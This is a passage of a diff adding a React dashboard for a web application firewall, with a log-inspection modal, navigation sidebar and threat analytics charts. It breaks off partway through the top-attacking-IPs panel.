@@ -1,0 +1,5504 @@
+import React, { useState, useEffect } from 'react';
+import { createPortal } from 'react-dom';
+import { motion, AnimatePresence } from 'framer-motion';
+import {
+  ShieldAlert, LayoutDashboard, Activity, BarChart2,
+  Settings as SettingsIcon, Server, Search, Filter, ShieldCheck,
+  AlertTriangle, Globe, Lock
+} from 'lucide-react';
+import { AreaChart, Area, XAxis, YAxis, CartesianGrid, Tooltip as RechartsTooltip, ResponsiveContainer, PieChart, Pie, Cell, ComposedChart, Bar } from 'recharts';
+import { getLogs, getStats, getTimeline, getAttackTypes, getTopRules, getSeverityDistribution, getTopIPs, getRules, getRuleDetails, enableRule, disableRule, setParanoiaLevel, getRulesStats, getRulesHistory, resetRules, getHealth, getGeneralSettings, saveGeneralSettings, getLogSettings, saveLogSettings, getWafSettings, saveWafSettings, changeAdminPassword, restartWafEngine, reloadNginxProxy, purgeStatsCache, syncSignatures, markFalsePositive, getFalsePositives, updateFalsePositiveStatus, updateFalsePositiveNote, deleteFalsePositive, createExclusion, getExclusions, updateExclusionStatus, updateExclusionNote, deleteExclusion, getExclusionsAnalytics, getExclusionsHistory, previewExclusionRule, getDiscoveredEndpoints, getRecentlyDiscoveredEndpoints, getApiProtectionAnalytics, getHardeningSettings, saveHardeningSettings, getAntiDefacementSettings, saveAntiDefacementSettings, getMLStats, getMLLogs, getMLTimeline } from './services/api';
+import { Copy, Check, ChevronLeft, ChevronRight, X, Clock, Database, Code, ShieldAlert as AlertIcon, AlertTriangle as AlertTriangleIcon, LogOut, Brain } from 'lucide-react';
+import Login from './components/Login';
+import DdosBotMitigation from './components/DdosBotMitigation';
+
+import './index.css';
+
+function parseJwt(token) {
+  try {
+    const base64Url = token.split('.')[1];
+    const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
+    const jsonPayload = decodeURIComponent(window.atob(base64).split('').map(function (c) {
+      return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+    }).join(''));
+    return JSON.parse(jsonPayload);
+  } catch {
+    return null;
+  }
+}
+
+function HighlightedJson({ json }) {
+  if (!json) return null;
+
+  const jsonStr = JSON.stringify(json, null, 2);
+  const lines = jsonStr.split('\n');
+
+  const tokenizeLine = (line) => {
+    const tokenRegex = /("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+-]?\d+)?|[{}[\]:,]|\s+)/g;
+    const matches = line.match(tokenRegex) || [line];
+
+    return matches.map((token, index) => {
+      let className = 'json-punctuation';
+      if (/^"/.test(token)) {
+        if (/:$/.test(token)) {
+          className = 'json-key';
+        } else {
+          className = 'json-string';
+        }
+      } else if (/^(true|false)$/.test(token)) {
+        className = 'json-boolean';
+      } else if (/^null$/.test(token)) {
+        className = 'json-null';
+      } else if (/^-?\d+/.test(token)) {
+        className = 'json-number';
+      }
+
+      return (
+        <span key={index} className={className}>
+          {token}
+        </span>
+      );
+    });
+  };
+
+  return (
+    <pre className="json-pre">
+      <code>
+        {lines.map((line, lineIndex) => (
+          <div key={lineIndex} className="json-line">
+            <span className="line-number">{lineIndex + 1}</span>
+            <span className="line-content">{tokenizeLine(line)}</span>
+          </div>
+        ))}
+      </code>
+    </pre>
+  );
+}
+
+function LogDetailsModal({ isOpen, log, onClose, onMarkFalsePositive }) {
+  const [copied, setCopied] = useState(false);
+  const [showReqHeaders, setShowReqHeaders] = useState(false);
+  const [showResHeaders, setShowResHeaders] = useState(false);
+
+  useEffect(() => {
+    if (copied) {
+      const t = setTimeout(() => setCopied(false), 2000);
+      return () => clearTimeout(t);
+    }
+  }, [copied]);
+
+  useEffect(() => {
+    if (isOpen) {
+      const timer = setTimeout(() => {
+        setShowReqHeaders(false);
+        setShowResHeaders(false);
+      }, 0);
+      return () => clearTimeout(timer);
+    }
+  }, [isOpen]);
+
+  if (!isOpen || !log) return null;
+
+  const handleCopy = () => {
+    const raw = log.raw_log || log;
+    const textToCopy = JSON.stringify(raw, null, 2);
+
+    if (navigator.clipboard && window.isSecureContext) {
+      navigator.clipboard.writeText(textToCopy)
+        .then(() => setCopied(true))
+        .catch(err => console.error("Copy failed", err));
+    } else {
+      try {
+        const textArea = document.createElement("textarea");
+        textArea.value = textToCopy;
+        textArea.style.position = "fixed";
+        textArea.style.left = "-999999px";
+        document.body.appendChild(textArea);
+        textArea.focus();
+        textArea.select();
+        const successful = document.execCommand('copy');
+        document.body.removeChild(textArea);
+        if (successful) setCopied(true);
+      } catch (err) {
+        console.error("Fallback copy error", err);
+      }
+    }
+  };
+
+  return createPortal(
+    <div className="modal-overlay" onClick={onClose}>
+      <div className="modal-content" onClick={(e) => e.stopPropagation()} style={{ maxWidth: '680px' }}>
+        <div className="modal-header">
+          <div className="modal-title">
+            <AlertIcon size={20} color="#ef4444" />
+            <span>Inspection: Log Transaction ID: <span style={{ fontFamily: 'monospace', color: '#3b82f6' }}>{log.id}</span></span>
+          </div>
+          <button className="modal-close-btn" onClick={onClose}>
+            <X size={18} />
+          </button>
+        </div>
+        <div className="modal-body" style={{ maxHeight: '80vh', overflowY: 'auto' }}>
+          
+          {/* Metadata Grid */}
+          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px', marginBottom: '20px', background: 'rgba(255,255,255,0.02)', padding: '16px', borderRadius: '8px', border: '1px solid rgba(255,255,255,0.05)' }}>
+            <div>
+              <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase' }}>Timestamp</div>
+              <div style={{ fontSize: '14px', fontWeight: 500, marginTop: '4px' }}>{log.timestamp}</div>
+            </div>
+            <div>
+              <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase' }}>Attacker IP</div>
+              <div style={{ fontSize: '14px', fontWeight: 500, fontFamily: 'monospace', color: '#3b82f6', marginTop: '4px' }}>{log.client_ip}</div>
+            </div>
+            <div>
+              <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase' }}>Attack Vector</div>
+              <div style={{ fontSize: '14px', marginTop: '4px' }}>
+                <span className={`severity-badge severity-${(log.severity || 'low').toLowerCase()}`} style={{ marginRight: '8px' }}>
+                  {log.severity}
+                </span>
+                {log.attack_type}
+              </div>
+            </div>
+            <div>
+              <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase' }}>Triggered Rule ID</div>
+              <div style={{ fontSize: '14px', fontFamily: 'monospace', marginTop: '4px' }}>{log.rule_id || 'N/A'}</div>
+            </div>
+            <div>
+              <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase' }}>Country</div>
+              <div style={{ fontSize: '14px', fontWeight: 500, marginTop: '4px', display: 'flex', alignItems: 'center', gap: '6px' }}>
+                <Globe size={14} color="#3b82f6" />
+                <span>{log.country || 'Unknown'}</span>
+              </div>
+            </div>
+            <div>
+              <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase' }}>Source ASN / Org</div>
+              <div style={{ fontSize: '14px', fontWeight: 500, fontFamily: 'monospace', color: '#93c5fd', marginTop: '4px', textOverflow: 'ellipsis', overflow: 'hidden', whiteSpace: 'nowrap' }} title={log.source_asn_org}>
+                {log.source_asn_org || 'Unknown'}
+              </div>
+            </div>
+            <div style={{ gridColumn: 'span 2' }}>
+              <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase' }}>Requested URI</div>
+              <div style={{ fontSize: '13px', fontFamily: 'monospace', color: '#ef4444', wordBreak: 'break-all', marginTop: '4px' }}>
+                <span style={{ color: '#a1a1aa', fontWeight: 600, marginRight: '6px' }}>{log.method}</span>
+                {log.uri}
+              </div>
+            </div>
+            {log.message && (
+              <div style={{ gridColumn: 'span 2' }}>
+                <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase' }}>Primary Rule Message</div>
+                <div style={{ fontSize: '13px', color: '#fde047', marginTop: '4px' }}>{log.message}</div>
+              </div>
+            )}
+          </div>
+
+          {/* Request Headers */}
+          <div style={{ marginBottom: '16px' }}>
+            <button 
+              type="button" 
+              onClick={() => setShowReqHeaders(!showReqHeaders)}
+              className="pagination-btn"
+              style={{ width: '100%', display: 'flex', justifyContent: 'space-between', padding: '10px 14px', background: 'rgba(255,255,255,0.03)', margin: 0 }}
+            >
+              <span style={{ fontSize: '13px', fontWeight: 600, color: '#e4e4e7' }}>Request Headers ({Object.keys(log.request_headers || {}).length})</span>
+              <span style={{ color: '#a1a1aa' }}>{showReqHeaders ? '▼' : '►'}</span>
+            </button>
+            {showReqHeaders && (
+              <div style={{ background: 'rgba(0,0,0,0.2)', padding: '12px', border: '1px solid rgba(255,255,255,0.05)', borderTop: 'none', borderBottomLeftRadius: '6px', borderBottomRightRadius: '6px', maxHeight: '220px', overflowY: 'auto' }}>
+                {Object.keys(log.request_headers || {}).length === 0 ? (
+                  <div style={{ color: '#a1a1aa', fontSize: '12px', textAlign: 'center', padding: '10px' }}>No request headers recorded.</div>
+                ) : (
+                  <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '12px' }}>
+                    <tbody>
+                      {Object.entries(log.request_headers || {}).map(([k, v]) => (
+                        <tr key={k} style={{ borderBottom: '1px solid rgba(255,255,255,0.03)' }}>
+                          <td style={{ color: '#a1a1aa', padding: '6px 0', fontWeight: 600, width: '30%', verticalAlign: 'top', wordBreak: 'break-all' }}>{k}</td>
+                          <td style={{ color: '#e4e4e7', padding: '6px 8px', fontFamily: 'monospace', wordBreak: 'break-all', verticalAlign: 'top' }}>{v}</td>
+                        </tr>
+                      ))}
+                    </tbody>
+                  </table>
+                )}
+              </div>
+            )}
+          </div>
+
+          {/* Response Headers */}
+          <div style={{ marginBottom: '16px' }}>
+            <button 
+              type="button" 
+              onClick={() => setShowResHeaders(!showResHeaders)}
+              className="pagination-btn"
+              style={{ width: '100%', display: 'flex', justifyContent: 'space-between', padding: '10px 14px', background: 'rgba(255,255,255,0.03)', margin: 0 }}
+            >
+              <span style={{ fontSize: '13px', fontWeight: 600, color: '#e4e4e7' }}>Response Headers ({Object.keys(log.response_headers || {}).length})</span>
+              <span style={{ color: '#a1a1aa' }}>{showResHeaders ? '▼' : '►'}</span>
+            </button>
+            {showResHeaders && (
+              <div style={{ background: 'rgba(0,0,0,0.2)', padding: '12px', border: '1px solid rgba(255,255,255,0.05)', borderTop: 'none', borderBottomLeftRadius: '6px', borderBottomRightRadius: '6px', maxHeight: '220px', overflowY: 'auto' }}>
+                {Object.keys(log.response_headers || {}).length === 0 ? (
+                  <div style={{ color: '#a1a1aa', fontSize: '12px', textAlign: 'center', padding: '10px' }}>No response headers recorded.</div>
+                ) : (
+                  <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '12px' }}>
+                    <tbody>
+                      {Object.entries(log.response_headers || {}).map(([k, v]) => (
+                        <tr key={k} style={{ borderBottom: '1px solid rgba(255,255,255,0.03)' }}>
+                          <td style={{ color: '#a1a1aa', padding: '6px 0', fontWeight: 600, width: '30%', verticalAlign: 'top', wordBreak: 'break-all' }}>{k}</td>
+                          <td style={{ color: '#e4e4e7', padding: '6px 8px', fontFamily: 'monospace', wordBreak: 'break-all', verticalAlign: 'top' }}>{v}</td>
+                        </tr>
+                      ))}
+                    </tbody>
+                  </table>
+                )}
+              </div>
+            )}
+          </div>
+
+          {/* Violations Detail */}
+          {log.violations && log.violations.length > 0 && (
+            <div style={{ marginBottom: '20px' }}>
+              <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase', fontWeight: 600, marginBottom: '8px' }}>Rule Violations & Matching Details</div>
+              <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                {log.violations.map((violation, idx) => (
+                  <div key={idx} style={{ background: 'rgba(255,255,255,0.01)', border: '1px solid rgba(255,255,255,0.05)', padding: '14px', borderRadius: '6px' }}>
+                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px', flexWrap: 'wrap', gap: '6px' }}>
+                      <span style={{ fontFamily: 'monospace', fontWeight: 700, color: '#3b82f6', fontSize: '13px' }}>Rule ID: {violation.rule_id}</span>
+                      {violation.file && (
+                        <span style={{ fontSize: '11px', color: '#a1a1aa', fontFamily: 'monospace', textOverflow: 'ellipsis', overflow: 'hidden', whiteSpace: 'nowrap', maxWidth: '300px' }} title={`${violation.file}:${violation.line_number}`}>
+                          {violation.file.split('/').pop()}:{violation.line_number}
+                        </span>
+                      )}
+                    </div>
+                    <div style={{ fontSize: '13px', color: '#fde047', marginBottom: '8px' }}>{violation.message}</div>
+                    
+                    {/* Matched Data / Violating Payload */}
+                    {violation.data && (
+                      <div style={{ marginTop: '8px' }}>
+                        <div style={{ fontSize: '10px', color: '#a1a1aa', textTransform: 'uppercase', marginBottom: '4px', fontWeight: 500 }}>Violating Parameter / Matched Payload</div>
+                        <pre style={{ margin: 0, padding: '8px 12px', background: 'rgba(239, 68, 68, 0.05)', border: '1px solid rgba(239, 68, 68, 0.2)', borderRadius: '4px', color: '#fca5a5', fontSize: '12px', whiteSpace: 'pre-wrap', wordBreak: 'break-all', fontFamily: 'monospace' }}>
+                          {violation.data}
+                        </pre>
+                      </div>
+                    )}
+                    
+                    {/* Match Pattern / Regex Signature */}
+                    {violation.pattern && (
+                      <div style={{ marginTop: '8px' }}>
+                        <div style={{ fontSize: '10px', color: '#a1a1aa', textTransform: 'uppercase', marginBottom: '4px', fontWeight: 500 }}>WAF Rule Matching Pattern (Regex)</div>
+                        <code style={{ display: 'block', padding: '6px 10px', background: 'rgba(0,0,0,0.3)', border: '1px solid rgba(255,255,255,0.05)', borderRadius: '4px', color: '#60a5fa', fontSize: '12px', fontFamily: 'monospace', wordBreak: 'break-all' }}>
+                          {violation.pattern}
+                        </code>
+                      </div>
+                    )}
+                  </div>
+                ))}
+              </div>
+            </div>
+          )}
+
+          {/* Original Audit Log */}
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
+            <span style={{ fontSize: '12px', fontWeight: 600, color: '#a1a1aa', textTransform: 'uppercase' }}>Complete Original Audit Log</span>
+            <div style={{ display: 'flex', gap: '8px' }}>
+              {onMarkFalsePositive && (
+                <button
+                  className="pagination-btn"
+                  onClick={() => onMarkFalsePositive(log)}
+                  style={{ padding: '4px 10px', fontSize: '12px', borderColor: 'rgba(16, 185, 129, 0.4)', background: 'rgba(16, 185, 129, 0.05)', color: '#a7f3d0' }}
+                >
+                  <ShieldCheck size={14} color="#10b981" />
+                  <span>Mark as FP</span>
+                </button>
+              )}
+              <button className="pagination-btn" onClick={handleCopy} style={{ padding: '4px 10px', fontSize: '12px' }}>
+                {copied ? <Check size={14} color="#10b981" /> : <Copy size={14} />}
+                <span>{copied ? "Copied!" : "Copy JSON"}</span>
+              </button>
+            </div>
+          </div>
+
+          <HighlightedJson json={log.raw_log || log} />
+        </div>
+        <div className="modal-footer">
+          <button className="modal-btn secondary" onClick={onClose}>Close</button>
+        </div>
+      </div>
+    </div>,
+    document.body
+  );
+}
+
+function Sidebar({ activeTab, setActiveTab, handleLogout, userRole, collapsed, setCollapsed }) {
+  const navItems = [
+    { id: 'analytics', label: 'Dashboard', icon: LayoutDashboard },
+    { id: 'logs', label: 'Live Logs', icon: Activity },
+    { id: 'ml_engine', label: 'AI/ML Engine', icon: Brain },
+    { id: 'false_positives', label: 'False Positives', icon: ShieldCheck },
+    { id: 'exceptions', label: 'Exceptions', icon: AlertTriangle },
+    { id: 'rules', label: 'Rules', icon: ShieldAlert },
+    { id: 'api_protection', label: 'API Protection', icon: Globe },
+    { id: 'ddos_bot', label: 'Bot & DDoS', icon: Lock },
+    { id: 'integrations', label: 'Integrations', icon: Server },
+    ...(userRole === 'admin' ? [{ id: 'settings', label: 'Settings', icon: SettingsIcon }] : []),
+  ];
+
+  const ToggleIcon = collapsed ? ChevronRight : ChevronLeft;
+
+  return (
+    <div className={`sidebar ${collapsed ? 'collapsed' : ''}`}>
+      <div className="sidebar-brand" style={{ 
+        position: 'relative', 
+        display: 'flex', 
+        alignItems: 'center', 
+        padding: collapsed ? '0 8px 32px' : '0 26px 32px',
+        height: '60px'
+      }}>
+        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+          <img 
+            src="/WAFlogo.ico" 
+            alt="WAF Logo" 
+            style={{ 
+              height: collapsed ? '20px' : '28px', 
+              width: collapsed ? '20px' : '28px', 
+              objectFit: 'contain' 
+            }} 
+            className="brand-icon" 
+          />
+          {!collapsed && <span className="brand-text">CyberSentinel WAF</span>}
+        </div>
+        <div 
+          onClick={() => setCollapsed(!collapsed)} 
+          style={{ 
+            cursor: 'pointer', 
+            display: 'flex', 
+            alignItems: 'center', 
+            justifyContent: 'center',
+            color: 'var(--text-primary)',
+            position: 'absolute',
+            right: collapsed ? '10px' : '24px',
+            top: collapsed ? '2px' : '2px',
+            width: '24px',
+            height: '24px',
+            borderRadius: '6px',
+            background: 'rgba(255, 255, 255, 0.06)',
+            border: '1px solid rgba(255, 255, 255, 0.12)',
+            boxShadow: '0 2px 6px rgba(0,0,0,0.3)',
+            zIndex: 20
+          }}
+          className="sidebar-toggle"
+          title={collapsed ? "Expand Sidebar" : "Collapse Sidebar"}
+        >
+          <ToggleIcon size={14} />
+        </div>
+      </div>
+      <div className="nav-menu">
+        {navItems.map((item) => {
+          const Icon = item.icon;
+          return (
+            <div
+              key={item.id}
+              className={`nav-item ${activeTab === item.id ? 'active' : ''}`}
+              onClick={() => setActiveTab(item.id)}
+            >
+              <Icon size={18} />
+              <span>{item.label}</span>
+            </div>
+          );
+        })}
+      </div>
+      <div className="sidebar-footer" style={{ marginTop: 'auto', padding: '24px 0', borderTop: '1px solid rgba(255, 255, 255, 0.05)' }}>
+        <div className="nav-item" onClick={handleLogout} style={{ color: '#ef4444' }}>
+          <LogOut size={18} />
+          <span>Logout</span>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function ThreatAnalytics() {
+  const [stats, setStats] = useState({
+    total_requests: 0,
+    total_blocked: 0,
+    sqli_count: 0,
+    xss_count: 0,
+    top_attack_type: '-',
+    total_unique_ips: 0
+  });
+  const [attackDistribution, setAttackDistribution] = useState([]);
+  const [severityDistribution, setSeverityDistributionData] = useState([]);
+  const [timelineData, setTimelineData] = useState([]);
+  const [topRules, setTopRules] = useState([]);
+  const [topIPs, setTopIPs] = useState([]);
+  const [loading, setLoading] = useState(true);
+  const [refreshInterval, setRefreshInterval] = useState(3000);
+  const [liveUpdates, setLiveUpdates] = useState(true);
+
+  useEffect(() => {
+    getGeneralSettings().then(settings => {
+      if (settings.refreshInterval) {
+        if (settings.refreshInterval === 'off') setRefreshInterval(0);
+        else setRefreshInterval(parseInt(settings.refreshInterval) * 1000 || 5000);
+      }
+      if (settings.liveUpdates !== undefined) setLiveUpdates(settings.liveUpdates);
+    }).catch(err => console.error("Failed to load general settings", err));
+  }, []);
+
+  const fetchAnalytics = async () => {
+    try {
+      const [statsRes, distRes, sevRes, timeRes, rulesRes, ipsRes] = await Promise.all([
+        getStats(),
+        getAttackTypes(),
+        getSeverityDistribution(),
+        getTimeline(),
+        getTopRules(),
+        getTopIPs()
+      ]);
+
+      setStats(statsRes);
+
+      const mappedDist = distRes
+        .filter(d => d.attack_type && d.attack_type !== 'Unknown')
+        .map(d => ({ name: d.attack_type, value: d.count }));
+      setAttackDistribution(mappedDist);
+
+      const mappedSev = sevRes.map(s => ({ name: s.severity, value: s.count }));
+      setSeverityDistributionData(mappedSev);
+
+      const mappedTime = timeRes.data.map(t => {
+        let displayTime = t.time;
+        if (displayTime.includes('T')) {
+          displayTime = displayTime.split('T')[1];
+        } else if (displayTime.includes(' ')) {
+          const parts = displayTime.split(' ');
+          displayTime = parts[parts.length - 1];
+        }
+        return {
+          time: displayTime,
+          attacks: t.count
+        };
+      });
+      setTimelineData(mappedTime);
+
+      setTopRules(rulesRes.slice(0, 5));
+      setTopIPs(ipsRes.slice(0, 5));
+    } catch (err) {
+      console.error("Failed to fetch analytics data", err);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      fetchAnalytics();
+    }, 0);
+    if (refreshInterval > 0 && liveUpdates) {
+      const interval = setInterval(fetchAnalytics, refreshInterval);
+      return () => {
+        clearTimeout(timer);
+        clearInterval(interval);
+      };
+    }
+    return () => clearTimeout(timer);
+  }, [refreshInterval, liveUpdates]);
+
+  const COLORS = {
+    'SQL Injection': '#fb923c',
+    'XSS': '#ec4899',
+    'RCE': '#ef4444',
+    'Protocol Violation': '#3b82f6',
+    'LFI/RFI': '#a855f7',
+    'PHP Injection': '#f43f5e',
+    'Scanner/Recon': '#eab308',
+    'Anomaly Threshold Exceeded': '#6b7280',
+    'Critical': '#ef4444',
+    'High': '#f97316',
+    'Medium': '#eab308',
+    'Low': '#3b82f6'
+  };
+
+  const severityColors = ['#ef4444', '#f97316', '#eab308', '#3b82f6'];
+
+  if (loading && timelineData.length === 0) {
+    return (
+      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: '400px', color: '#a1a1aa', gap: '12px' }}>
+        <Activity className="animate-spin" size={24} color="#3b82f6" />
+        <span>Initializing CyberSentinel Threat Analytics Engine...</span>
+      </div>
+    );
+  }
+
+  return (
+    <motion.div
+      className="dashboard-grid animate-fade-in"
+      initial={{ opacity: 0, y: 10 }}
+      animate={{ opacity: 1, y: 0 }}
+      transition={{ duration: 0.4 }}
+    >
+      {/* Metric Cards */}
+      <div className="metric-card glass-panel" style={{ gridColumn: 'span 2' }}>
+        <div className="metric-header">
+          <span>Total Requests Analyzed</span>
+          <div className="metric-icon-wrapper blue"><Activity size={18} /></div>
+        </div>
+        <div className="metric-value">{stats.total_requests.toLocaleString()}</div>
+        <div className="metric-trend trend-down">
+          <Clock size={12} /> <span>Real-time capture</span>
+        </div>
+      </div>
+
+      <div className="metric-card glass-panel" style={{ gridColumn: 'span 3' }}>
+        <div className="metric-header">
+          <span>Blocked WAF Threats</span>
+          <div className="metric-icon-wrapper red"><AlertIcon size={18} /></div>
+        </div>
+        <div className="metric-value" style={{ color: '#ef4444' }}>{stats.total_blocked.toLocaleString()}</div>
+        <div className="metric-trend trend-up">
+          <div className="pulse-dot" style={{ marginRight: '6px' }}></div>
+          <span>Active protection shields active</span>
+        </div>
+      </div>
+
+      <div className="metric-card glass-panel" style={{ gridColumn: 'span 2' }}>
+        <div className="metric-header">
+          <span>SQL Injection Count</span>
+          <div className="metric-icon-wrapper orange"><Database size={18} /></div>
+        </div>
+        <div className="metric-value" style={{ color: '#fb923c' }}>{stats.sqli_count.toLocaleString()}</div>
+        <div className="metric-trend trend-down">
+          <span>Inbound vectors</span>
+        </div>
+      </div>
+
+      <div className="metric-card glass-panel" style={{ gridColumn: 'span 2' }}>
+        <div className="metric-header">
+          <span>Cross-Site Scripting (XSS)</span>
+          <div className="metric-icon-wrapper orange" style={{ color: '#ec4899', background: 'rgba(236,72,153,0.1)' }}><Code size={18} /></div>
+        </div>
+        <div className="metric-value" style={{ color: '#ec4899' }}>{stats.xss_count.toLocaleString()}</div>
+        <div className="metric-trend trend-down">
+          <span>Application shields</span>
+        </div>
+      </div>
+
+      <div className="metric-card glass-panel" style={{ gridColumn: 'span 3' }}>
+        <div className="metric-header">
+          <span>Unique Attacking IPs</span>
+          <div className="metric-icon-wrapper orange"><Globe size={18} /></div>
+        </div>
+        <div className="metric-value" style={{ color: '#3b82f6' }}>{stats.total_unique_ips.toLocaleString()}</div>
+        <div className="metric-trend trend-up">
+          <span>Globally distributed attackers</span>
+        </div>
+      </div>
+
+      {/* Main Timeline Chart */}
+      <div className="chart-card glass-panel" style={{ gridColumn: 'span 8' }}>
+        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px' }}>
+          <div className="card-title" style={{ marginBottom: 0 }}>
+            <Activity size={18} color="#3b82f6" />
+            Attack Timeline / Inbound Threats Over Time
+          </div>
+          <div className="pulse-container">
+            <div className="pulse-dot"></div>
+            <span>Live Sync</span>
+          </div>
+        </div>
+        <div className="chart-container" style={{ minHeight: '300px' }}>
+          <ResponsiveContainer width="100%" height="100%">
+            <AreaChart data={timelineData}>
+              <defs>
+                <linearGradient id="colorAttacks" x1="0" y1="0" x2="0" y2="1">
+                  <stop offset="5%" stopColor="#ef4444" stopOpacity={0.4} />
+                  <stop offset="95%" stopColor="#ef4444" stopOpacity={0.0} />
+                </linearGradient>
+              </defs>
+              <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.05)" vertical={false} />
+              <XAxis dataKey="time" stroke="#a1a1aa" fontSize={11} tickLine={false} axisLine={false} interval="preserveStartEnd" minTickGap={50} />
+              <YAxis stroke="#a1a1aa" fontSize={11} tickLine={false} axisLine={false} />
+              <RechartsTooltip
+                contentStyle={{ backgroundColor: 'rgba(15, 16, 22, 0.95)', border: '1px solid rgba(255,255,255,0.08)', borderRadius: '12px', boxShadow: '0 10px 25px rgba(0,0,0,0.5)' }}
+                itemStyle={{ color: '#fff' }}
+              />
+              <Area type="monotone" dataKey="attacks" name="Triggered Events" stroke="#ef4444" strokeWidth={2} fillOpacity={1} fill="url(#colorAttacks)" />
+            </AreaChart>
+          </ResponsiveContainer>
+        </div>
+      </div>
+
+      {/* Severity Distribution Pie Chart */}
+      <div className="chart-card glass-panel" style={{ gridColumn: 'span 4' }}>
+        <div className="card-title">
+          <AlertIcon size={18} color="#ef4444" />
+          Severity Distribution
+        </div>
+        <div className="chart-container" style={{ minHeight: '300px', display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center' }}>
+          <ResponsiveContainer width="100%" height="70%">
+            <PieChart>
+              <Pie
+                data={severityDistribution.filter(s => s.value > 0)}
+                cx="50%"
+                cy="50%"
+                innerRadius={60}
+                outerRadius={80}
+                paddingAngle={4}
+                dataKey="value"
+              >
+                {severityDistribution.filter(s => s.value > 0).map((entry, index) => (
+                  <Cell key={`cell-${index}`} fill={COLORS[entry.name] || '#3b82f6'} />
+                ))}
+              </Pie>
+              <RechartsTooltip
+                contentStyle={{ backgroundColor: 'rgba(15, 16, 22, 0.95)', border: '1px solid rgba(255,255,255,0.08)', borderRadius: '8px' }}
+                itemStyle={{ color: '#fff' }}
+              />
+            </PieChart>
+          </ResponsiveContainer>
+          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px 16px', width: '100%', padding: '12px 24px' }}>
+            {severityDistribution.map((entry) => (
+              <div key={entry.name} style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '12px' }}>
+                <div style={{ width: '10px', height: '10px', borderRadius: '50%', backgroundColor: COLORS[entry.name] || '#3b82f6' }}></div>
+                <span style={{ color: '#a1a1aa' }}>{entry.name}:</span>
+                <span style={{ fontWeight: 600 }}>{entry.value}</span>
+              </div>
+            ))}
+          </div>
+        </div>
+      </div>
+
+      {/* Attack Categories Distribution */}
+      <div className="chart-card glass-panel" style={{ gridColumn: 'span 5' }}>
+        <div className="card-title">
+          <ShieldAlert size={18} color="#f97316" />
+          Attack Vector Distribution
+        </div>
+        <div className="chart-container" style={{ minHeight: '320px', display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center' }}>
+          {attackDistribution.length === 0 ? (
+            <div style={{ color: '#a1a1aa', fontSize: '13px' }}>No categories data recorded</div>
+          ) : (
+            <>
+              <ResponsiveContainer width="100%" height="70%">
+                <PieChart>
+                  <Pie
+                    data={attackDistribution}
+                    cx="50%"
+                    cy="50%"
+                    innerRadius={0}
+                    outerRadius={75}
+                    paddingAngle={2}
+                    dataKey="value"
+                  >
+                    {attackDistribution.map((entry, index) => (
+                      <Cell key={`cell-${index}`} fill={COLORS[entry.name] || severityColors[index % severityColors.length]} />
+                    ))}
+                  </Pie>
+                  <RechartsTooltip
+                    contentStyle={{ backgroundColor: 'rgba(15, 16, 22, 0.95)', border: '1px solid rgba(255,255,255,0.08)', borderRadius: '8px' }}
+                    itemStyle={{ color: '#fff' }}
+                  />
+                </PieChart>
+              </ResponsiveContainer>
+              <div style={{ display: 'flex', flexWrap: 'wrap', gap: '8px 12px', justifyContent: 'center', width: '100%', padding: '12px 10px' }}>
+                {attackDistribution.map((entry, index) => (
+                  <div key={entry.name} style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '11px' }}>
+                    <div style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: COLORS[entry.name] || severityColors[index % severityColors.length] }}></div>
+                    <span style={{ color: '#a1a1aa', whiteSpace: 'nowrap' }}>{entry.name}:</span>
+                    <span style={{ fontWeight: 600 }}>{entry.value}</span>
+                  </div>
+                ))}
+              </div>
+            </>
+          )}
+        </div>
+      </div>
+
+      {/* Top Attacking IPs List */}
+      <div className="chart-card glass-panel" style={{ gridColumn: 'span 4' }}>
+        <div className="card-title">
+          <Globe size={18} color="#3b82f6" />
+          Top Threat Origin IPs
+        </div>
+        <div className="chart-container" style={{ minHeight: '320px' }}>
+          <div style={{ display: 'flex', flexDirection: 'column', gap: '14px', width: '100%', height: '100%', justifyContent: 'center' }}>
+            {topIPs.length === 0 ? (
+              <div style={{ textAlign: 'center', color: '#a1a1aa', fontSize: '13px' }}>No malicious IPs recorded yet.</div>
+            ) : (
+              topIPs.map((ipObj, index) => (
+                <div key={ipObj.ip || index} style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '13px' }}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                      <span style={{ color: '#a1a1aa', fontWeight: 600, fontSize: '12px', width: '16px' }}>#{index + 1}</span>
